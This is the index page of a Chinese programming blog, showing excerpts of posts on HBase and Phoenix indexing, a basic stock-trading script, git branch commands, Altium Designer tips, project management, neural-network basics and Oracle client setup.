<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dacb7f8da7b9fd36dda92f92eb64e965/" rel="bookmark">
			以写Hbase表的方式更新Phoenix索引
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步 查询出Phoenix表所有的索引以及索引对应的字段。
Phoenix元数据表：system.catalog
Phoenix在执行查询语句：
select TABLE_NAME as INDEX_NAME,COLUMN_NAME
from system.catalog
where DATA_TABLE_NAME='${hbaseTable}'
and INDEX_TYPE is null and COLUMN_NAME!=':ROW'
order by TABLE_NAME,ORDINAL_POSITION
此处：hbaseTable与Phoenix表名一致，是相互对应的。
将查询结果进行处理，得到如下数据，以index_name为key，以index字段为value：
indexFeildMap =
Map(AC_INDEX01 -&gt; List(sale_id, dt),
AC_INDEX02 -&gt; List(object_id, dt),
AC_INDEX05 -&gt; List(loan_id, dt))
第二步 查询出hive源表中，所有的索引字段、rowkey字段，组成DataFrame临时表，此临时表提供给查询生成每个索引对应的hbase表。
所有索引字段和rowkey的查询语句如下：
Select md5(concat(type,loan_id,item_id,date)) as md5Id
,sale_id
,loan_id
,'20220801' as dt
,object_id
from temp.acc_20220801
第三步 遍历如下indexFeildMap，将md5Id（即rowkey，还可以做加盐处理）与各个索引字段，结合在一起，即为“索引对应的hbase表”的rowkey，插入进去，则Phoenix索引更新完毕。
注意：注意：注意：源hbase表的rowkey与索引字段，结合时，不能直接用"\\x00”字符串。
经观察，索引的主键是原表的字段组合而成的，索引表会把所有索引字段+rowkey拼接起来写进Hbase ,做索引的主键为索引表的RowKey。并且组合的时候还要加上\x00这样的字符串。
经观察，索引hbase表，只有rowkey、0:_0两个有效字段，且字段0:_0,值为“x”。
但是直接使用"\\x00”字符串，生产新rowkey时，会出错。
如上图，直接以拼接字符串的形式往里插就可以，但是发现hbase会对\做二进制转译，‘\’会被转译为\x5c。
如上问题怎么解决了？
解决的方案就是：
在插入数据的时候直接以byte[] 的形式往hbase表插。
本例中，先用var rowkeyBtBf: Array[Byte]封装索引的主键，再转成string类型，便于DataFrame临时表做查询。
例如：
AC_INDEX01索引对应的子查询single_sql ==== :
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dacb7f8da7b9fd36dda92f92eb64e965/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89e7d41cc7d03fa0af3e88887dbec734/" rel="bookmark">
			[025量化交易] python跌了就买涨了就卖策略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# http://localhost:8888/lab # jupyter lab import tushare as ts import numpy as np # 导入画图工具matplotlib import matplotlib.pyplot as plt import pandas as pd # 初始化pro接口 pro = ts.pro_api('') print("获取股票数据.") zgpa = pro.daily(ts_code='000006.SZ', start_date='20190101', end_date='20190301') # print(zgpa.head) # 下面我们来创建交易信号 # 为了不影响原始数据，这里创建一个新的数据表 # 只保留原始数据中的日期index zgpa_signal = pd.DataFrame(index=zgpa.index) # 为了更能体现股票的真实价值 # 使用Adj Close调整价格作为股票价格 zgpa_signal['price'] = zgpa['pre_close'] # 增加一个字段，来存储股价的变化 diff()现价与昨天价格差值 zgpa_signal['diff'] = zgpa_signal['price'].diff() # 增加diff字段后，第一行会出现空值，我们使用0来进行填补 fillna补充缺失值 zgpa_signal = zgpa_signal.fillna(0.0) # 如果股价上涨或不变，则标记为0 如果股价下跌，则标记为1 zgpa_signal['signal'] = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89e7d41cc7d03fa0af3e88887dbec734/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4e15b4a0371b07973130eda46dc1b43/" rel="bookmark">
			1*1卷积核实现降维
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1*1卷积核的作用延伸开来说的话挺多，但是其实质是：通过N个1*1的卷积核，能够将M张图像转化为N张图像。
比如，某个卷积层的输入有256个特征图，通过64个1*1的卷积核，输出的特征图即为64个。
依次为出发点还可以引申出很多作用：
1.通过卷积核为1*1的卷积层可以增加网络的非线性能力，提高网络的表达能力；
2.在ResNet模组中加入1*1卷积，能够保证两边的通道数核图像尺寸一致；
3.在XCeption模组中加入1*1卷积，主要负责处理通道间的混合。
当然，除此之外还有很多用法，但是万变不离其宗，掌握了核心才能发散。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2c8c38519e693d328272d4ddb2e9bef/" rel="bookmark">
			如何做好项目管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我把管理技能分为两类，分别为项目管理和团队管理，这篇文章教你如何做好项目管理。
在讲述这篇文章前，先简单介绍一下我的管理经验：之前在百度呆了3年半，系统学习了百度的项目管理流程，19年来到小米后，带领ShareSave团队做了1年项目管理和团队管理工作，之后带领海外商城基础服务后端团队，做了1年团队管理工作。
纵观我带过的项目，在保证项目质量的同时，少有延期的情况，主要还是源于自己的一套项目管理经验，下面我以ShareSave为例，将这套经验分享给大家。
没有考过PMP证书，也没有经过系统的项目管理培训，文章内容全凭经验之谈，如有偏颇，欢迎指出，定会改进！
一、项目流程 我把项目管理分为4个阶段，分别为需求阶段、研发阶段、测试阶段和上线阶段。
项目管理过程中，需要借助项目管理工具，我们以TB（Teambition）为例。 1、产品规划 为什么我需要将“产品规划”单独列出来，因为这个真的太重要了，产品规划就像是海上的灯塔，指引你前进的方向。
有了产品规划，产品可以将需求提前放入需求池，每个迭代只做高优需求。
下面是产品规划要求：
2、需求评审 需求评审阶段，一定是需要产品给出完整的需求文档，如果有UI交互的地方，需要提前给出原型图，拒绝没有原型图的需求评审。
需求一定是要非常明确，最好是能细化到具体的功能点，拒绝模糊需求（比如一句话需求）。
下面是需求评审要求：
为了提高需求评审的效率，我们在需求评审前，需要做很多准备工作，比如需求前期沟通、研发初步评估，前期工作准备到位后，需求评审期间就可以主要讨论问题，避免一个需求反复沟通的情况。
下面是需求阶段流程（有些环节可以删掉，仅供参考）：
3、研发阶段 技术方案是整个项目的灵魂，很多项目到后期出现问题，很大原因就是技术方案没做好。
项目排期用于控制整体项目的节奏，有以下几点经验之谈：
项目排期每天不要排满，建议预留 20% buffer;
如果项目时间紧，可以采用分批提测的方式；
排期要有里程碑，开发、联调、提测、上线、验收等；
项目排期不能仅到上线阶段，还需包括线上灰度和项目验收；
前端排期依赖UI设计。
下面是项目排期要求：
下面是研发阶段流程（有些环节可以删掉，仅供参考）： 4、测试&amp;上线阶段 上线方案可以为线上的稳定性保驾护航，重要性不言而喻。 因为上线导致严重的线上问题，这个项目可能就白干了。
关于测试&amp;上线流程，有以下几点经验之谈：
测试环节需要大家一起过测试Case；
提测前，有的项目还需要做项目演示；
上线前，需要一起过上线方案，突出风险点；
上线后可能需要小流量验证，或者灰度；
有的项目还有项目验收环节，最后才全员开放。
下面是测试&amp;上线阶段流程（有些环节可以删掉，仅供参考）：
5、需求变更 重点说一下需求变更，这也是很多程序员头疼的问题，只要做到正确把控，其实也没那么可怕。
下面是需求变更要求：
总结一下：需求变更越早越好，变更需求，需要调整排期，临近上线，原则上不再允许需求变更，否则需要领导审批。 总结一下项目管理的几个重要的点：
产品规划就像是海上的灯塔，不能乱打一气；
需求文档一定要尽可能详细，拒绝无原型的需求评审；
技术方案是整个项目的灵魂，这块多投入时间绝对不亏；
项目排期有里程碑、有buffer，排期需包括线上灰度和项目验收时间；
Code Review、测试Case都不能少；
上线方案要预知风险，为线上的稳定性保驾护航。
二、每日站会 为什么要提这个呢，因为有的同学平时闷声不响，最后给你憋大招。所以你需要知道大家每天的工作进度、问题和风险，方便你推动和协调解决，甚至会对项目节奏临时调整。
站会怎么开，这个也有讲究，10-15分钟最佳，每位同学都要参与：
昨天做了什么？
今天打算做什么？
遇到什么问题？
备注：站会时间早上或晚上最佳，方式比较灵活，前期可以每周2-3次，后期就每天都开。
三、敏捷开发模式 1、什么是敏捷开发 我们一般习惯用瀑布模型，它以文档为驱动，将软件生命周期划分为固定的六个基本活动，并且规定了它们自上而下、相互衔接的次序，如同瀑布流水，逐级下落。
那什么是敏捷开发呢？敏捷开发是一种以人为核心、迭代、循序渐进的开发方法，它能应对快速的需求变化，以交付客户满意的软件为最终目标，其中 Scrum 就是实现敏捷开发的标准和流程之一。 2、Scrum Scrum 就是实现敏捷开发的标准和流程之一，这个必须掌握，要不然后面的实战会有点蒙圈，大家如果对 Scrum 非常清楚，这部分内容可以直接跳过。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2c8c38519e693d328272d4ddb2e9bef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f36e7e8c02744fb74a3c8585a4d092c2/" rel="bookmark">
			【git分支】创建本地、远端的分支的常用命令总结（带图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git与本地仓库、远端，各种命令关系图如下：
目录 创建本地分支查看分支创建本地仓库分支删除分支 创建远程分支新建远程分支关联本地新分支删除远程分支 创建本地分支 查看分支 git branch 查看本地仓库的分支
git branch -r 查看远程分支
git status 查看分支当前状态
创建本地仓库分支 git branch [branch_name] 创建本地分支
git checkout [branch_name] 切换到其他分支
git checkout -b [branch_name] 该命令【直接合并】上述操作，【创建分支并切换至新建的分支】 删除分支 git branch -d [branch_name]
创建远程分支 新建远程分支 把新建的本地分支push到远程服务器，
远程分支与本地分支同名（可随意起名）：
$ git push origin 分支名（本地）:分支名(远端)
关联本地新分支 git push --set-upstream origin [branch_name] (刚刚创建的本地分支名)
远程分支创建成功
删除远程分支 这两种方式都可以删除指定的远程分支
推送一个空分支到远程分支，其实就相当于删除远程分支：
git push origin :[branch_name]
直接删除远程分支
git push origin --delete [branch_name]
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dc79f8481f81022a56ae46ebcfd1571/" rel="bookmark">
			Duplicate Net Names Wire Net......
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 这是本人使用Altium Designer软件绘制原理图文件，进行工程编译（Compile）时遇到的问题
一、问题分析： Duplicate Net Names 中文意思就是：网络名字重复了
哪里重复了呢？注意看弹窗下面有一个栏目：“details”，中文意思就是详情、描述
这里把重复的2条网络名称显示出来了，你可以双击，然后AD软件会自动帮你跳转到这条网络，并高亮显示。
然后你就知道，哦！原理是这2跳线的网络重复了
于是呼，我就在想：这2条网络名字怎么会一样的？
然后我就点击这条线，然后鼠标右键查看属性。结果，也没看见网络名称相关的信息。
说白了，这条线除了颜色，长宽，也没啥信息了。
本人使用的AD软件版本是Altium Designer(18.0)
那我就想到这个管脚pin是不是管脚号重复了？
鼠标右键，查看属性，发现果然这一个元器件里的2个管脚的管脚号重复了
犯了低级错误了…
二、最后把元器件的库封装里的管脚号改一下就解决了 如果你也遇到了一样的问题，希望我的文章可以帮你解决了bug。 如果你的bug还没解决，没关系，咱继续百度！哈哈哈! 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8559a20f0307467f772f2c253ada2c3/" rel="bookmark">
			AD18批量修改一部分或者全部器件位号的方法！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在任何一个公司嵌入式硬件开发的主板全都是有很多sheet的，而硬件工程师做的往往也都是在老的图纸上进行修改或者再设计，也正因为如此，我们在画原理图的时候尽量不要去改动已有部分的位号，以免PCB工程师骂人！ 就算自己画PCB的时候也会晕头转向！
很多工程师，甚至老员工都不懂得如何批量操作更改位号，或者只更改某一页某一部分的位号，刚好今天恰好要用到这个功能，其他同事都是一知半解，网上查的都说的模棱两可，只能起到领路的作用，大部分还是要自己去弄。我就只能自己研究了一波，终于搞明白了，下面分享给大家，直接按步骤来，傻瓜式操作！不需要自己费尽心思再去研究！上干货！！！
1、直接找到工具里的标注，原理图标注 2、 原理图界面如下，共有五点要关注的 就是我圈中的这几个，第一个处理顺序，也就是初始位号从哪个位置开始变的意思，这个默认就好了，关系不大。第二个也是默认，这个就是位号的意思。第三个原理图页重点关注，我们看到这个界面已经被填满了，有好多原理图，是的，现在的嵌入式，功能很多，都是这样分页设计的，基本每一页对应产品的一种功能，第四个就是你要看好自己需要修改的是哪一页，这里我要修改的是第13页，然后直接在前边的框框里勾选【注意到后边还有一个框框，留在后面再说，这里记住有个印象就好】，之后是第五个，也就是建议更改列表，在这里显示的就是刚才你选中的原理图那一页里面所有的元器件位号，也就是本文要修改的对象。
3、针对第五点详细展开说明里面包含的意义 分为两列，如下图所示，第一列用红色框出，第二列用绿色框出。红色框框里面的位号决定了哪一些可以被操作【红色框里的小圆圈代表是锁住的意思，如果这一列里的哪一个被勾选了，就意味着这个位号被锁住了，无法编辑了。如果我们希望这一页里一些器件不被修改，那么直接全程锁住即可。】绿色框里的属于是在红色的框编辑完之后再进行一个筛选的过程，决定了最终实际被操作的位号。可能有些小伙伴还是不明白，那我就再解释下，如果明白了的，可以直接跳过，继续往下看。
ps:绿色可以认为是红色的子集，红色框里决定了理论上可以被修改的范围【不被锁，那么就可以被修改】，红色框内的确定好了范围之后，绿色就代表再在这个已经选中的范围里继续选择一个范围。
4、红色框内点击鼠标右键，选择标号，就可以对框内所有位号进行锁定与解除锁定 5、选择锁定全部标号之后的效果见下图，此时所有位号都无法进行变更 6、用鼠标左键点击，对下面几个位号进行取消锁定 同理，如果你也想只对此页的一部分位号进行变更，那么操作跟我一样，全部锁定后，再对需要变更的位号进行左键单击依次取消锁定，以此来进行下一步的操作。
7、确定了需要变更的范围后，对建议值这一列进行第二次的范围筛选 8、建议值这一列也是一样的选择，勾选了的代表锁定了，未勾选的就是待被变更的 根据上述分析，我们得出结论：最终变更的范围实际上就是红色框框未勾选的，与绿色框框未勾选的进行一个取交集的操作，交集里面的才是可以变更的。
9、经过以上几个步骤，变更的范围确定了，那么接下来需要把待变更的全部都复位，也就是变成《？》来处于一个等待变更状态，选择下面的RESET ALL即可 这里的ALL 指的是我们经过以上几个步骤筛选好的范围，而不是这一页里的所有位号，大家不要慌，直接点就行。
10、最重要的来了，这个界面熟悉不，就是第二步里让大家留意的，现在我们来征服它 选中的这一页图纸后面的这个框框直接勾选，然后填的数值就代表:从这个位号开始，进行累加。也就是说你这里填多少，需要变更的那些位号，就以此为基础进行一个位号的累加，所以这里一定不要和其他的sheet元器件位号有重叠，否则所有步骤要打算重来。
ps:这里大家可以稳妥起见，直接填一个位号很大的进去，保证不会重复。
11、以上十步都操作完了，接下来就是一个更新操作了，先点左下这个更新更改列表，进行一个预操作，也就是先预览一下，如果没问题，再点右下角的接受更改 我们看到，我画红色勾的就是最终变更了的，而叉的就是没有变更掉的，可以看到，最终变更的就是我们之前说的，两列的交集才是最终执行变更的位号。
ps:我刚才填的是从100开始，但是这里变更后直接是109起步，说明之间的那几个重复的被默认剔除掉了，看来还是很智能的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bc43103fc35e9320c49090227ce0c07/" rel="bookmark">
			js游戏集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天给大家分享一些js写的小游戏，因为游戏比较多，因此小编在这里只给大家部分游戏运行截图。下面我们来看看具体有哪些游戏。
2048
https://url18.ctfile.com/f/7715018-667225283-f95496
九宫数独
https://url18.ctfile.com/f/7715018-667225403-a85c3b
九宫格拼图
https://url18.ctfile.com/f/7715018-667225402-294a11
俄罗斯方块
https://url18.ctfile.com/f/7715018-667225365-c7bcf0
像素小鸟
https://url18.ctfile.com/f/7715018-667225472-84d8ea
军旗
https://url18.ctfile.com/f/7715018-667225404-44f36c
别踩白块
https://url18.ctfile.com/f/7715018-667225284-fd43a2
吃豆人
https://url18.ctfile.com/f/7715018-667225307-d5ec47
国际象棋
https://url18.ctfile.com/f/7715018-667225400-468c54
坦克大战
https://url18.ctfile.com/f/7715018-667225449-e69a6a
大鱼吃小鱼
https://url18.ctfile.com/f/7715018-667225364-cfa219
恐龙快跑
https://url18.ctfile.com/f/7715018-667225405-01d863
打鱼
https://url18.ctfile.com/f/7715018-667225341-32bdb3
水果忍者
https://url18.ctfile.com/f/7715018-667225446-09dd5c
激光防线
https://url18.ctfile.com/f/7715018-667225401-5b9541
超级玛丽
https://url18.ctfile.com/f/7715018-667225305-e4e05e
飞机大战
https://url18.ctfile.com/f/7715018-667225384-4d0bea
驴子跳
https://url18.ctfile.com/f/7715018-667225421-7dc41e
拼图变态版
https://url18.ctfile.com/f/7715018-667225424-09eef4
一个都不能死
https://url18.ctfile.com/f/7715018-667225474-25cb8b
一线连
https://url18.ctfile.com/f/7715018-667225475-535d26
中国围棋
https://url18.ctfile.com/f/7715018-667227951-d7cf9f
中国象棋
https://url18.ctfile.com/f/7715018-667227982-5fddcb
五子棋
https://url18.ctfile.com/f/7715018-667225451-3bfb6f
五子棋残局
https://url18.ctfile.com/f/7715018-667225455-f57048
扫雷
https://url18.ctfile.com/f/7715018-667225426-227752
推箱子
https://url18.ctfile.com/f/7715018-667225450-e6f114
数独
https://url18.ctfile.com/f/7715018-667225430-17fb97
是男人就下100层
https://url18.ctfile.com/f/7715018-667225428-e3da0f
是男人就下一百层变态版
https://url18.ctfile.com/f/7715018-667225429-cc0a48
植物大战僵尸v1
https://url18.ctfile.com/f/7715018-667330266-debbed
植物大战僵尸v2
https://url18.ctfile.com/f/7715018-667227934-fc0f78
消灭星星
https://url18.ctfile.com/f/7715018-667225473-5044c5
贪吃蛇
https://url18.ctfile.com/f/7715018-667225447-72d4d4
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6bc43103fc35e9320c49090227ce0c07/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e3fd5751c12a9c2008966aa8865d7cb/" rel="bookmark">
			神经网络的基本构成要素,神经网络三个要素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		影响人工神经网络性能的三要素 谷歌人工智能写作项目：小发猫
什么是神经网络 神经网络可以指向两种，一个是生物神经网络，一个是人工神经网络人工神经网络原理公式，人工神经网络基本原理。生物神经网络：一般指生物的大脑神经元，细胞，触点等组成的网络，用于产生生物的意识，帮助生物进行思考和行动。
人工神经网络（ArtificialNeuralNetworks，简写为ANNs）也简称为神经网络（NNs）或称作连接模型（ConnectionModel），它是一种模仿动物神经网络行为特征，进行分布式并行信息处理的算法数学模型。
这种网络依靠系统的复杂程度，通过调整内部大量节点之间相互连接的关系，从而达到处理信息的目的。人工神经网络：是一种应用类似于大脑神经突触联接的结构进行信息处理的数学模型。
在工程与学术界也常直接简称为“神经网络”或类神经网络。
人工神经网络由哪几部分构成? 10 神经网络具体是什么？ 神经网络由大量的神经元相互连接而成。每个神经元接受线性组合的输入后，最开始只是简单的线性加权，后来给每个神经元加上了非线性的激活函数，从而进行非线性变换后输出。
每两个神经元之间的连接代表加权值，称之为权重（weight）。不同的权重和激活函数，则会导致神经网络不同的输出。举个手写识别的例子，给定一个未知数字，让神经网络识别是什么数字。
此时的神经网络的输入由一组被输入图像的像素所激活的输入神经元所定义。在通过非线性激活函数进行非线性变换后，神经元被激活然后被传递到其他神经元。重复这一过程，直到最后一个输出神经元被激活。
从而识别当前数字是什么字。
神经网络的每个神经元如下基本wx+b的形式，其中x1、x2表示输入向量w1、w2为权重，几个输入则意味着有几个权重，即每个输入都被赋予一个权重b为偏置biasg(z)为激活函数a为输出如果只是上面这样一说，估计以前没接触过的十有八九又必定迷糊了。
事实上，上述简单模型可以追溯到20世纪50/60年代的感知器，可以把感知器理解为一个根据不同因素、以及各个因素的重要性程度而做决策的模型。举个例子，这周末北京有一草莓音乐节，那去不去呢？
决定你是否去有二个因素，这二个因素可以对应二个输入，分别用x1、x2表示。此外，这二个因素对做决策的影响程度不一样，各自的影响程度用权重w1、w2表示。
一般来说，音乐节的演唱嘉宾会非常影响你去不去，唱得好的前提下即便没人陪同都可忍受，但如果唱得不好还不如你上台唱呢。所以，我们可以如下表示：x1：是否有喜欢的演唱嘉宾。
x1=1你喜欢这些嘉宾，x1=0你不喜欢这些嘉宾。嘉宾因素的权重w1=7x2：是否有人陪你同去。x2=1有人陪你同去，x2=0没人陪你同去。
是否有人陪同的权重w2=3。这样，咱们的决策模型便建立起来了：g(z)=g(w1x1+w2x2+b)，g表示激活函数，这里的b可以理解成为更好达到目标而做调整的偏置项。
一开始为了简单，人们把激活函数定义成一个线性函数，即对于结果做一个线性变化，比如一个简单的线性激活函数是g(z)=z，输出都是输入的线性变换。
后来实际应用中发现，线性激活函数太过局限，于是引入了非线性激活函数。
神经网络算法的三大类分别是？ 神经网络算法的三大类分别是：1、前馈神经网络：这是实际应用中最常见的神经网络类型。第一层是输入，最后一层是输出。如果有多个隐藏层，我们称之为“深度”神经网络。他们计算出一系列改变样本相似性的变换。
各层神经元的活动是前一层活动的非线性函数。2、循环网络：循环网络在他们的连接图中定向了循环，这意味着你可以按照箭头回到你开始的地方。他们可以有复杂的动态，使其很难训练。他们更具有生物真实性。
循环网络的目的是用来处理序列数据。在传统的神经网络模型中，是从输入层到隐含层再到输出层，层与层之间是全连接的，每层之间的节点是无连接的。但是这种普通的神经网络对于很多问题却无能无力。
循环神经网路，即一个序列当前的输出与前面的输出也有关。
具体的表现形式为网络会对前面的信息进行记忆并应用于当前输出的计算中，即隐藏层之间的节点不再无连接而是有连接的，并且隐藏层的输入不仅包括输入层的输出还包括上一时刻隐藏层的输出。
3、对称连接网络：对称连接网络有点像循环网络，但是单元之间的连接是对称的（它们在两个方向上权重相同）。比起循环网络，对称连接网络更容易分析。这个网络中有更多的限制，因为它们遵守能量函数定律。
没有隐藏单元的对称连接网络被称为“Hopfield网络”。有隐藏单元的对称连接的网络被称为玻尔兹曼机。
扩展资料：应用及发展：心理学家和认知科学家研究神经网络的目的在于探索人脑加工、储存和搜索信息的机制，弄清人脑功能的机理，建立人类认知过程的微结构理论。
生物学、医学、脑科学专家试图通过神经网络的研究推动脑科学向定量、精确和理论化体系发展，同时也寄希望于临床医学的新突破；信息处理和计算机科学家研究这一问题的目的在于寻求新的途径以解决不能解决或解决起来有极大困难的大量问题，构造更加逼近人脑功能的新一代计算机。
神经网络是什么？ 生物神经网络主要是指人脑的神经网络，它是人工神经网络的技术原型。
人脑是人类思维的物质基础，思维的功能定位在大脑皮层，后者含有大约10^11个神经元，每个神经元又通过神经突触与大约103个其它神经元相连，形成一个高度复杂高度灵活的动态网络。
作为一门学科，生物神经网络主要研究人脑神经网络的结构、功能及其工作机制，意在探索人脑思维和智能活动的规律。
人工神经网络是生物神经网络在某种简化意义下的技术复现，作为一门学科，它的主要任务是根据生物神经网络的原理和实际应用的需要建造实用的人工神经网络模型，设计相应的学习算法，模拟人脑的某种智能活动，然后在技术上实现出来用以解决实际问题。
因此，生物神经网络主要研究智能的机理；人工神经网络主要研究智能机理的实现，两者相辅相成。
神经网络 的四个基本属性是什么? 神经网络的四个基本属性：（1）非线性：非线性是自然界的普遍特征。脑智能是一种非线性现象。人工神经元处于两种不同的激活或抑制状态，它们在数学上是非线性的。
由阈值神经元组成的网络具有更好的性能，可以提高网络的容错性和存储容量。（2）无限制性：神经网络通常由多个连接广泛的神经元组成。
一个系统的整体行为不仅取决于单个神经元的特性，而且还取决于单元之间的相互作用和互连。通过单元之间的大量连接来模拟大脑的非限制性。联想记忆是一个典型的无限制的例子。
（3）非常定性：人工神经网络具有自适应、自组织和自学习的能力。神经网络处理的信息不仅会发生变化，而且非线性动态系统本身也在发生变化。迭代过程通常用来描述动态系统的演化。
（4）非凸性：在一定条件下，系统的演化方向取决于特定的状态函数。例如，能量函数的极值对应于系统的相对稳定状态。非凸性是指函数具有多个极值，系统具有多个稳定平衡态，从而导致系统演化的多样性。
扩展资料：神经网络的特点优点：人工神经网络的特点和优越性，主要表现在三个方面：第一，具有自学习功能。
例如实现图像识别时，只在先把许多不同的图像样板和对应的应识别的结果输入人工神经网络，网络就会通过自学习功能，慢慢学会识别类似的图像。自学习功能对于预测有特别重要的意义。
预期未来的人工神经网络计算机将为人类提供经济预测、市场预测、效益预测，其应用前途是很远大的。第二，具有联想存储功能。用人工神经网络的反馈网络就可以实现这种联想。第三，具有高速寻找优化解的能力。
寻找一个复杂问题的优化解，往往需要很大的计算量，利用一个针对某问题而设计的反馈型人工神经网络，发挥计算机的高速运算能力，可能很快找到优化解。参考资料：百度百科——人工神经网络。
人工智能三大要素有哪些 人工智能产业技术的：算法、计算能力、信息大数据融合，成为人工智能发展最基本、最基础的基本三要素。
收集的大量数据，数据是驱动人工智能取得更好的识别率和精准度的核心因素;落实在产品应用上，算法可表现为：视频结构化(对视频数据的识别、分类、提取和分析)、生物识别(人脸、虹膜、指纹、人脸识别等)、物体特征识别(不同物体识别，不同物体代表性物体识别，如：车牌识别系统)等几大类。
互联网时代大数据迎来爆发式增长，全球的数据总量都飞快的增长，数据高速积累的同时现有算力根本无法匹配。
传统架构基础硬件的计算力也不能满足大量增长的多数据信息计算的同时，更无法满足人工智能相关的高性能计算需求，多PU硬件组合+强大的多功能并行处理计算能力，成为当下人工智能必备的基本平台。
数据总量飞速的增长、积累的同时，信息数据的收集、整理与融合成为了人工智能深度学习和算法升级与服务应用落地的根本，大数据与融合计算成为了人工智能发展必然的关键。
扩展资料：人工智能需要从大量数据中进行学习，丰富的数据集是其中非常重要的因素，丰富的数据积累，给深度学习创造更加丰富的数据训练集，是人工智能算法与深度学习训练必备的、不可或缺的良好的基础。
像战胜人类的AlphaGo，其学习过程的核心数据是来自互联网的3000万例棋谱，而这些数据的积累是历经了十多年互联网行业的发展成铸就的。
可见，所有基于深度学习算法的人工智能，均需具备深厚的数据信息资源和专项数据积累，才能取得AI服务应用的突破性进展。离开了基础数据，机器的智慧仿生是不可能实现的。
广东傲智在公司成立前，就已经具备行业应用强大深厚的大数据方面的基础数据信息，这也是广东傲智能在算法深度开发、深度学习和计算力平台研发方面发展迅速又有AI针对性的核心竞争力。
参考资料：百度百科——人工智能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/577673679a58027cc715ddb76d6c213a/" rel="bookmark">
			【无标题】HDMI 波形自动化分析工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概述
该工具可以自动化分析hdmi I2C交互过程的消息，包括HDCP、EDID、SCDC。
二、实验现象
HDCP
EDID
SCDC
三、工具下载
地址：https://download.csdn.net/download/yjlyyj/86510720
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a588bea4bec9711dab4b76d80eff118/" rel="bookmark">
			pl/sql developer连接oracle11g配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载plsql软件包及instantclient软件包并解压
2、将解压好的instantclient安装包放置到自定义路径
3、打开PLSQL Developer，选择Tools -&gt; perference -&gt; Connection，配置其中的Oracle Home和OCI Library
4、配置电脑环境变量
如果配置以上步骤，plsql还是无法登录，请继续第6步配置环境变量
右击"我的电脑" - “属性” - “高级” - “环境变量” - “系统环境变量”:
a.选择"Path" - 点击"编辑", 把 “D:\app\instantclient_11_2;” 加入;
b.点击"新建", 变量名设置为"TNS_ADMIN", 变量值设置为"D:\app\instantclient_11_2;", 点击"确定";
c.点击"新建", 变量名设置为"NLS_LANG", 变量值设置为"SIMPLIFIED CHINESE_CHINA.ZHS16GBK", 点击"确定";
5、配置监听服务
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/933aa62a4fb989079a3620824ed8948f/" rel="bookmark">
			【maven】idea导入maven解决方案：Unable to import Maven project
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
